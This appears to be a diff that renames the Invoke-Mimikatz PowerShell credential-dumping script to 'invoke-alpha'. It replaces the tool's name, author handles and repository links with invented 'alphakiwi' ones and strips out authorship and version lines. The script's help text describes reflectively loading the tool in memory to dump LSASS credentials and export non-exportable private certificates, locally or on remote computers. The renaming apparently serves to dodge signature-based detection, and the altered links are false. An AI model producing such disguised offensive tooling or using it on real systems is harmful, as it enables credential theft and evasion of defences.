@@ -1,40 +1,38 @@
-function Invoke-Mimikatz
+function invoke-alpha
 {
 <#
 .SYNOPSIS
 
-This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as
-dump credentials without ever writing the mimikatz binary to disk. 
+This script leverages alpha 2.0 and Invoke-ReflectivePEInjection to reflectively load alpha completely in memory. This allows you to do things such as
+dump credentials without ever writing the alpha binary to disk. 
 The script has a ComputerName parameter which allows it to be executed against multiple computers.
 
 This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.
 
-Function: Invoke-Mimikatz
-Author: Joe Bialek, Twitter: @JosephBialek
-Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
+Function: invoke-alpha
+alpha Author: Benjamin DELPY `alphakiwi`. Blog: http://blog.alphakiwi.com. Email: benjamin@alphakiwi.com. Twitter @alphakiwi
 License:  http://creativecommons.org/licenses/by/3.0/fr/
-Required Dependencies: Mimikatz (included)
+Required Dependencies: alpha (included)
 Optional Dependencies: None
 Version: 1.5
-ReflectivePEInjection version: 1.1
-Mimikatz version: 2.0 alpha (2/16/2015)
+
 
 .DESCRIPTION
 
-Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any 
-functionality provided with Mimikatz.
+Reflectively loads alpha 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any 
+functionality provided with alpha.
 
 .PARAMETER DumpCreds
 
-Switch: Use mimikatz to dump credentials out of LSASS.
+Switch: Use alpha to dump credentials out of LSASS.
 
 .PARAMETER DumpCerts
 
-Switch: Use mimikatz to export all private certificates (even if they are marked non-exportable).
+Switch: Use alpha to export all private certificates (even if they are marked non-exportable).
 
 .PARAMETER Command
 
-Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz "privilege::debug exit" as an example.
+Supply alpha a custom command line. This works exactly the same as running the alpha executable like this: alpha "privilege::debug exit" as an example.
 
 .PARAMETER ComputerName
 
@@ -42,34 +40,34 @@ Optional, an array of computernames to run the script on.
 	
 .EXAMPLE
 
-Execute mimikatz on the local computer to dump certificates.
-Invoke-Mimikatz -DumpCerts
+Execute alpha on the local computer to dump certificates.
+invoke-alpha -DumpCerts
 
 .EXAMPLE
 
-Execute mimikatz on two remote computers to dump credentials.
-Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")
+Execute alpha on two remote computers to dump credentials.
+invoke-alpha -DumpCreds -ComputerName @("computer1", "computer2")
 
 .EXAMPLE
 
-Execute mimikatz on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
-Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
+Execute alpha on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
+invoke-alpha -Command "privilege::debug exit" -ComputerName "computer1"
 
 .NOTES
-This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY
+This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the alpha code written by Benjamin DELPY
 Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
-Find mimikatz at: http://blog.gentilkiwi.com
+Find alpha at: http://blog.alphakiwi.com
 
 .LINK
 
 Blog: http://clymb3r.wordpress.com/
-Benjamin DELPY blog: http://blog.gentilkiwi.com
+Benjamin DELPY blog: http://blog.alphakiwi.com
 
 Github repo: https://github.com/clymb3r/PowerShell
-mimikatz Github repo: https://github.com/gentilkiwi/mimikatz
+alpha Github repo: https://github.com/alphakiwi/alpha
 
 Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
-Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
+Blog on modifying alpha for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-alpha-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
 
 #>
 
@@ -2645,7 +2643,7 @@ $RemoteScriptBlock = {
 			### YOUR CODE GOES HERE
 			#########################################
                     Write-Verbose "Calling function with WString return type"
-				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_mimikatz"
+				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_alpha"
 				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
 				    {
 					    Throw "Couldn't find function address."
